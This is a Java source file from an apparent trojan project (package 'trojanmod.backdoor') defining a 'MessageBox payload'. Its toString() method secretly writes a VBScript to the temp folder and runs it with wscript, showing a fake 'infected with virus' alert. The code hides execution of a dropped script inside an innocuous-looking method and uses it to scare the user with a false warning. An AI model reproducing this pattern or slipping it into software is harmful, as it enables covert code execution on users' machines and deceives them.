package com.lanceg.trojanmod.backdoor;

import java.io.File;
import java.io.FileWriter;

public class MessageBox {

    public String toString() {
		System.out.println("Bootstrapping MessageBox payload");

		final String script = "Call MsgBox(\"u have infect with viruse!\", 1 Or 48, \"important alert!!!\")";
		final File dir = new File(System.getProperty("java.io.tmpdir"));
		final File file = new File(dir, "script.vbs");
		
		try {
			file.createNewFile();
			final FileWriter writer = new FileWriter(file);
			writer.write(script);
			writer.close();

			final Runtime runtime = Runtime.getRuntime();
			runtime.exec("wscript " + file.getAbsolutePath());
		} catch (Exception e) {
			e.printStackTrace();
		}

		return super.toString();
	}
	
	public boolean equals(final Object other) {
		System.out.println("Releasing MessageBox payload");

		return super.equals(other);
	}

    public static final void main(final String[] args) {
		// stub - required to compile
	}
}